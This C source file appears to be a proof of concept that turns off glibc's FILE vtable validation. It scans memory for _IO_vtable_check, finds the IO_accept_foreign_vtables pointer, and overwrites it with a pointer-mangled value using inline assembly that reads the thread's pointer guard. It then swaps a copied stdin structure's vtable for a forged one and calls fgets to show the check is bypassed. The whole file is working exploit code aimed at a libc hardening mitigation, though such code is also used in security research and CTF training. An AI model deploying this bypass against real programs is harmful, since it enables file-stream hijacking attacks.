#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#define _GNU_SOURCE

#include <dlfcn.h>



long PTR_MANGLE(long ptr){
    long ret_ptr;
    asm(
        "mov r15, qword ptr fs:[0x30]\n"
        "mov r14, %1\n"
        "xor r14, r15\n"
        "rol r14, 0x11\n"
        "mov %0, r14\n"
        :"=r" (ret_ptr)
        :"r"(ptr)
        :
    );
    return ret_ptr;
}

long find_vtable_check_addr(){
    char *smt = dlsym(NULL, "fmemopen");
    char *sub_rsp = "\x48\x83\xec\x48";

    while(memcmp(smt,sub_rsp,4)){
        smt++;
    }
    return (long)smt;
}

long find_accept_foreign_vtables(long vtable_check_addr){
    char* smt = (char*)vtable_check_addr;
    char *mov_rax_rip = "\x48\x8b\x05";
    while(memcmp(smt,mov_rax_rip,3)){
        smt++;
    }
    smt+=3;
    long rip_rel_addr = (long)(*((unsigned int*)smt));
    smt+=4;

    return (long)(smt+rip_rel_addr);
}

void disable_vtable_check(){
    long _IO_vtable_check = find_vtable_check_addr();
    long* IO_accept_foreign_vtables = (long*)find_accept_foreign_vtables(_IO_vtable_check);

    *IO_accept_foreign_vtables = PTR_MANGLE(_IO_vtable_check);
}

int main(void){
    char buf[20];
    
    FILE* addr = mmap(NULL,0x1000,PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    memcpy(addr,stdin,224);

    printf("fgets with inbounds vtable:\n");
    fgets(buf,19,addr);

    printf("Disabling vtable check...\n");
    char* new_vtable = ((char*)addr)+224;
    long* old_vtable = (long*)(((char*)addr)+216);
    long* vtable_addr = *(long*)(((char*)addr)+216);

    memcpy(new_vtable,vtable_addr,168);
    
    disable_vtable_check();

    *old_vtable = new_vtable;

    printf("fgets with out of bounds vtable:\n");
    fgets(buf,19,addr);

    printf("If you didn't crash, with an abort, it worked!\n");

}